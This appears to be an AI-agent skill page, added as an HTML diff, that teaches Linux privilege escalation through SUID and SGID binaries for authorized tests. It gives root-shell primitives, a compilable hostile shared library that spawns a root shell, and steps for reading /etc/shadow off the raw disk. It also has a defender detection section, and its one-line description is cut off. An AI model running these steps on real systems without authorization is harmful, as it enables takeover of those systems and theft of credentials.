@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: privesc-linux-vectors-suid-binaries</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>privesc-linux-vectors-suid-binaries</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when authorized Linux privilege escalation enumeration has</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-linux-vectors.html">privesc-linux-vectors</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-linux-vectors.html">privesc-linux-vectors</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-linux.html">privesc-linux</a> <a href="privesc-linux-vectors-sudo-misconfigurations.html">privesc-linux-vectors-sudo-misconfigurations</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>linpeas</td><td>2.x</td></tr><tr><td>findutils</td><td>4.9</td></tr><tr><td>gcc</td><td>13.2.0</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>SUID binaries run with the file owner&#x27;s privileges (usually root) no matter who executes them, which makes every nonstandard SUID binary a privilege escalation candidate on an authorized engagement. This sub-skill covers the complete SUID and SGID workflow: discover every privileged binary, filter the standard set down to the interesting outliers, match each outlier against known escalation primitives, and verify the primitive actually yields root before relying on it. Scope is authorized penetration tests, labs, and CTFs only.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate all SUID and SGID binaries with <code>find</code>, saving the full list to a file for local review.</li>
+<li>Subtract the standard set (sudo, su, passwd, mount, ping, and distro defaults) to isolate custom or unusual binaries.</li>
+<li>For each outlier, check GTFOBins for a known SUID primitive and read what the primitive requires.</li>
+<li>Inspect the binary for secondary weaknesses: <code>ldd</code> for hijackable libraries, <code>strings</code> for called commands and paths, writable config files it reads.</li>
+<li>Test the primitive in a way that proves euid 0 (run <code>id</code> through it) before building the full escalation.</li>
+<li>Exploit, confirm root, capture <code>id</code> output and the exact command chain for the report.</li>
+</ol>
+<h2>1. Full discovery and filtering</h2>
+<p>Collect the complete list first, then filter. Do this once and work from the file.</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null | sort &gt; /tmp/suid.txt
+find / -perm -2000 -type f 2&gt;/dev/null | sort &gt; /tmp/sgid.txt
+wc -l /tmp/suid.txt; cat /tmp/suid.txt</code></pre>
+<p>Example output shape: 20 to 40 lines on a typical server, mostly <code>/usr/bin/*</code> entries you recognize. Flag anything outside <code>/usr/bin</code> and <code>/bin</code>, anything under <code>/opt</code>, <code>/srv</code>, <code>/home</code>, or <code>/tmp</code>, and any binary whose name you do not recognize from a default install. LinPEAS highlights these in its SUID section, but always confirm by hand.</p>
+<pre><code class="language-bash">grep -v -E &quot;^/(usr/)?bin/(sudo|su|passwd|chsh|chfn|mount|umount|ping|newgrp|gpasswd|pkexec)$&quot; /tmp/suid.txt</code></pre>
+<h2>2. GTFOBins primitive matching</h2>
+<p>GTFOBins documents which binaries yield shells or file writes when run with elevated privileges. Look up each outlier by exact binary name.</p>
+<pre><code class="language-bash">ls -la /usr/local/bin/backup-tool
+file /usr/local/bin/backup-tool</code></pre>
+<p>Example reasoning: <code>/usr/bin/find</code> with SUID gives <code>find . -exec /bin/sh \; -quit</code>, which spawns a root shell because find keeps euid. <code>/usr/bin/vim</code> with SUID gives <code>:!/bin/sh</code>. A custom backup tool with no GTFOBins entry needs manual analysis (section 3), which is where real engagements are won.</p>
+<p>Always verify the primitive preserves privilege:</p>
+<pre><code class="language-bash">/usr/bin/find . -exec id \; -quit</code></pre>
+<p>Example output shape: <code>uid=1000(app) gid=1000(app) euid=0(root) groups=1000(app)</code>. The <code>euid=0(root)</code> confirms the primitive works. If output shows no euid 0, the binary drops privileges and the primitive is dead.</p>
+<h2>3. Shared library hijacking</h2>
+<p>SUID binaries that load libraries from writable paths, or fail to find a library, let you inject code that runs as root.</p>
+<pre><code class="language-bash">ldd /usr/local/bin/backup-tool</code></pre>
+<p>Example output shape:</p>
+<pre><code>linux-vdso.so.1 (0x00007ffd...)
+libcustom.so =&gt; not found
+libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x...)</code></pre>
+<p><code>libcustom.so =&gt; not found</code> is the signal: the loader will search the paths in <code>LD_LIBRARY_PATH</code> (usually sanitized for SUID), then the binary&#x27;s RUNPATH, then <code>ld.so.cache</code>, then default directories. Check for a writable RUNPATH with <code>readelf -d</code>:</p>
+<pre><code class="language-bash">readelf -d /usr/local/bin/backup-tool | grep -i -E &quot;runpath|rpath|needed&quot;</code></pre>
+<p>If RUNPATH points to a directory you can write to, compile a hostile library with the missing name and a constructor that spawns a shell:</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+__attribute__((constructor)) void pwn(void) {
+    setuid(0); setgid(0);
+    system(&quot;/bin/bash -p&quot;);
+}</code></pre>
+<pre><code class="language-bash">gcc -shared -fPIC -o libcustom.so pwn.c</code></pre>
+<p>Place it on the RUNPATH and execute the SUID binary. The constructor runs as root before <code>main</code>.</p>
+<h2>4. Strings, invoked commands, and config files</h2>
+<p>Custom SUID binaries often shell out to other programs or read config files. Both are attack surface.</p>
+<pre><code class="language-bash">strings /usr/local/bin/backup-tool | grep -E &quot;^/|system|popen|exec&quot;</code></pre>
+<p>Example output shape: lines like <code>/opt/backup.conf</code>, <code>/usr/bin/tar</code>, or <code>system(&quot;tar cf ...&quot;)</code>. If the binary calls <code>tar</code> by bare name, PATH hijacking applies (see the cron-and-path-hijacking sub-skill). If it reads <code>/opt/backup.conf</code> and that file is writable, you may control its behavior. If it uses <code>system()</code> with user-influenced input, command injection follows.</p>
+<h2>5. SGID binaries and group stepping stones</h2>
+<p>SGID binaries run with the group owner&#x27;s privileges. They rarely give root directly, but membership in groups like <code>adm</code> (log reading), <code>disk</code> (raw disk access), <code>lxd</code>, or <code>docker</code> is often equivalent to root.</p>
+<pre><code class="language-bash">cat /tmp/sgid.txt
+id</code></pre>
+<p>Example output shape: your user in the <code>disk</code> group plus an SGID binary owned by <code>disk</code> confirms raw block device access, which means reading <code>/etc/shadow</code> straight off the disk with <code>debugfs</code>. Treat SGID findings as group-membership stepping stones and chain them.</p>
+<h2>6. SUID on scripts is a dead end on Linux</h2>
+<p>The Linux kernel ignores the SUID bit on interpreted scripts for security. If <code>find</code> shows an SUID shell or Python script, the bit does nothing.</p>
+<pre><code class="language-bash">ls -la /opt/runme.sh
+file /opt/runme.sh</code></pre>
+<p>Do not waste time on SUID scripts themselves; instead check whether a privileged binary or cron job executes the script, which moves the attack to that caller. An SUID bit on a script is still worth reporting as a misconfiguration.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Binaries compiled with privilege-dropping wrappers call <code>setuid(getuid())</code> early; the GTFOBins primitive then runs as your user and <code>id</code> shows no euid 0, so always run the <code>id</code> verification first.</li>
+<li><code>ldd</code> on a setuid binary can behave differently from the real loader path resolution; confirm hijackability by testing with a harmless constructor that writes a marker file.</li>
+<li>Static binaries have no library attack surface at all; <code>ldd</code> reporting &quot;not a dynamic executable&quot; closes section 3 for that binary.</li>
+<li>GTFOBins entries assume standard builds; distro patches or AppArmor profiles can neuter a primitive, so test on the target rather than trusting the documentation alone.</li>
+<li>Capabilities (<code>getcap</code>) and SUID are separate mechanisms; a binary can have both, and the capability may be the actual escalation path when the SUID bit is a decoy.</li>
+<li>Container environments may show SUID binaries that are useless without the matching capability set; check <code>capsh --print</code> alongside the SUID list.</li>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>If no SUID outlier yields a primitive, pivot to SGID group stepping stones: <code>disk</code>, <code>lxd</code>, <code>docker</code>, <code>adm</code>, and <code>shadow</code> group memberships each have documented escalation chains.</li>
+<li>When a custom SUID binary has no GTFOBins entry, escalate to binary analysis: <code>ltrace</code> and <code>strace</code> reveal the files it opens and the commands it runs, which often expose the real weakness.</li>
+<li>If the binary reads a config file you cannot write, check the directory permissions: a writable directory lets you replace the file even when the file itself is read-only.</li>
+<li>When SUID as a class is clean, move to the sibling sub-skills: sudo misconfigurations and cron hijacking are the next highest-yield vector classes.</li>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders detect SUID abuse with file integrity monitoring that alerts on new or changed SUID binaries, auditd rules watching <code>execve</code> of known-dangerous SUID paths, and periodic <code>find / -perm -4000</code> baselining against a known-good list. Library hijacking leaves traces in the form of new <code>.so</code> files in odd directories and unusual <code>execve</code> parent-child relationships. From the authorized tester side, prefer primitives that do not write persistent files, and document every binary you touched so the report&#x27;s remediation section can name exact paths and recommended fixes (remove the SUID bit, move the binary, or replace it with a capability-scoped alternative).</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1548.001 (Setuid and Setgid)</li>
+<li>GTFOBins: https://gtfobins.github.io (per-binary SUID primitives)</li>
+<li>capabilities manual: https://man7.org/linux/man-pages/man7/capabilities.7.html</li>
+<li>ld.so manual: https://man7.org/linux/man-pages/man8/ld.so.8.html (library search order)</li>
+<li>HackTricks SUID section: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid</li>
+<li>ldd and readelf documentation: https://man7.org/linux/man-pages/man1/ldd.1.html</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
